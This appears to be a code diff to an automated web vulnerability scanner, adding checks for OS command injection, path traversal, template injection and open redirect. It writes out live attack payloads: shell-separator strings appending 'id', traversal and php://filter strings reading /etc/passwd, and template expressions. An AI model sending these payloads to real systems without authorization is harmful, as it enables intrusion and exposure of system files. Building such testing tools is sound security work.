@@ -1045,6 +1045,91 @@ class AssistSession:
             return True
         return False
 
+    def _probe(self, url: str, param: str, value: str, method: str = "GET",
+               extra: dict | None = None):
+        """One governed probe request. GET puts the payload in the query; POST sends a
+        form body. Returns (body, status, headers) or (None, None, {}). Scope+scheme
+        gated; the payload rides the HTTP client, never a shell."""
+        from urllib.parse import urlencode
+
+        from .web import WebAction
+        if self.browser is None:
+            return None, None, {}
+        if method.upper() == "GET":
+            act = WebAction("get", url=self._set_param(url, param, value))
+        else:
+            body = urlencode({param: value, **(extra or {})})
+            act = WebAction("request", url=url, method="POST", body=body,
+                            headers={"Content-Type": "application/x-www-form-urlencoded"})
+        _d, r = self.browser.run(act)
+        if r is None:
+            return None, None, {}
+        return (r.body or ""), r.status, (r.headers or {})
+
+    _PASSWD_RE = re.compile(r"root:.*?:0:0:", re.M)
+    _CMDI_RE = re.compile(r"\buid=\d+\([\w-]+\)\s+gid=\d+\(")
+
+    def confirm_cmdi(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Confirm OS command injection: append an `id` command via the common shell
+        separators; a hit is real `uid=…(…) gid=…(…)` output in the response. The
+        payload's ';'/'|'/'`'/'$()' are DATA to the target (WEB path, no local shell)."""
+        for sep in (";", "|", "&&", "&", "$(", "`", "\n"):
+            payload = f"127.0.0.1{sep}id" if sep not in ("$(", "`") else \
+                (f"127.0.0.1;$(id)" if sep == "$(" else "127.0.0.1;`id`")
+            body, _s, _h = self._probe(url, param, payload, method, extra)
+            if body and self._CMDI_RE.search(body):
+                m = self._CMDI_RE.search(body)
+                self._record_confirmed(url, "OS command injection", "critical", param,
+                                       f"payload {payload!r} → {m.group(0)}")
+                return True
+        return False
+
+    def confirm_lfi(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Confirm local file inclusion / path traversal: read /etc/passwd via several
+        traversal/wrapper encodings; a hit is a real passwd line (root:...:0:0:)."""
+        for payload in ("/etc/passwd", "../../../../../../etc/passwd",
+                        "....//....//....//....//etc/passwd",
+                        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+                        "php://filter/convert.base64-encode/resource=/etc/passwd"):
+            body, _s, _h = self._probe(url, param, payload, method, extra)
+            if body and self._PASSWD_RE.search(body):
+                self._record_confirmed(url, "Local file inclusion / path traversal",
+                                       "critical", param,
+                                       f"payload {payload!r} → /etc/passwd contents leaked")
+                return True
+        return False
+
+    def confirm_ssti(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Confirm server-side template injection: send a distinctive arithmetic
+        expression across engine syntaxes; a hit is the EVALUATED product in the
+        response while the literal expression is not (so it's execution, not reflection)."""
+        a, b = 31337, 7
+        product = str(a * b)                       # 219359 — unlikely to occur by chance
+        for tmpl in (f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}",
+                     f"<%= {a}*{b} %>", f"{{{a}*{b}}}"):
+            body, _s, _h = self._probe(url, param, tmpl, method, extra)
+            if body and product in body and tmpl not in body:
+                self._record_confirmed(url, "Server-side template injection", "critical",
+                                       param, f"payload {tmpl!r} evaluated to {product}")
+                return True
+        return False
+
+    def confirm_open_redirect(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Confirm an open redirect: point the parameter at an external host; a hit is a
+        3xx Location (or a meta/JS redirect) that sends the browser to that host."""
+        mark = "brukal-oob.example"
+        for payload in (f"https://{mark}/", f"//{mark}/", f"https:/{mark}"):
+            body, status, headers = self._probe(url, param, payload, method, extra)
+            loc = (headers.get("Location") or headers.get("location") or "") if headers else ""
+            redirect_hdr = status in (301, 302, 303, 307, 308) and mark in loc
+            meta_js = bool(body) and (f"url={payload}" in body.lower()
+                                      or f'location="{payload}"' in (body or "").lower())
+            if redirect_hdr or meta_js:
+                self._record_confirmed(url, "Open redirect", "medium", param,
+                                       f"payload {payload!r} → redirects to {mark}")
+                return True
+        return False
+
     def confirm_surface(self, max_params: int = 8) -> int:
         """Autonomously confirm boolean SQLi + reflected XSS on the GET parameters the
         crawl discovered — turning candidates into CONFIRMED findings without waiting
@@ -1052,17 +1137,21 @@ class AssistSession:
         Returns how many were confirmed."""
         if self.browser is None or self.surface is None:
             return 0
+        checks = (self.confirm_sqli, self.confirm_cmdi, self.confirm_lfi,
+                  self.confirm_ssti, self.confirm_xss, self.confirm_open_redirect)
         confirmed = tried = 0
         for base, names in list(self.surface.params.items()):
             for p in list(names):
                 if tried >= max_params:
                     return confirmed
                 tried += 1
-                try:
-                    if self.confirm_sqli(base, p) or self.confirm_xss(base, p):
-                        confirmed += 1
-                except Exception:
-                    pass
+                for check in checks:
+                    try:
+                        if check(base, p):
+                            confirmed += 1
+                            break               # one confirmed class per param is enough
+                    except Exception:
+                        pass
         return confirmed
 
     def learn(self, query: str) -> str:
